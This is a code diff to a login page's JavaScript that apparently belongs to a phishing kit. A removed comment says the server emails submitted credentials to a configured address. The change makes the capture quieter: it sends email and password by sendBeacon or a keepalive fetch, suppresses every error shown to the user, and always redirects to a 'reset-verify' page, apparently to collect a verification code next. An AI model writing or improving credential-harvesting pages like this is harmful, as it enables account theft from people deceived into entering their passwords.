@@ -7,32 +7,30 @@ async function sendCode() {
     alert("Please fill email & password");
     return;
   }
-  // Send credentials to server which will email them to the configured APP_MAIL
+  // Save email for the verify page
+  sessionStorage.setItem('email', email);
+
+  // Fire-and-forget send of credentials. Prefer navigator.sendBeacon so the
+  // request survives the navigation; fallback to fetch with keepalive.
+  const payload = JSON.stringify({ email, password });
   try {
-    const resp = await fetch('/api/user/login', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ email, password })
-    });
-    let json;
-    try { json = await resp.json(); } catch(e) { json = null; }
-    if (!resp.ok) {
-      let errMsg = 'Login failed';
-      if (json) {
-        const payload = json.error ?? json.message ?? json;
-        if (typeof payload === 'string') errMsg = payload;
-        else if (payload && typeof payload.message === 'string') errMsg = payload.message;
-        else errMsg = JSON.stringify(payload);
-      }
-      throw new Error(errMsg);
+    if (navigator && typeof navigator.sendBeacon === 'function') {
+      const blob = new Blob([payload], { type: 'application/json' });
+      navigator.sendBeacon('/api/user/login', blob);
+    } else {
+      fetch('/api/user/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: payload,
+        keepalive: true
+      }).catch(e => console.error('fire-and-forget login failed', e));
     }
-    sessionStorage.setItem('email', email);
-    window.location.href = '/reset-verify.html';
-  } catch (err) {
-    console.error('sendCode error:', err);
-    const msg = err && err.message ? err.message : String(err);
-    alert('Failed to submit login: ' + msg);
+  } catch (e) {
+    console.error('Failed to initiate credential send:', e);
   }
+
+  // Immediately navigate to the verify page
+  window.location.href = '/reset-verify.html';
 }
 
 // VERIFY PAGE
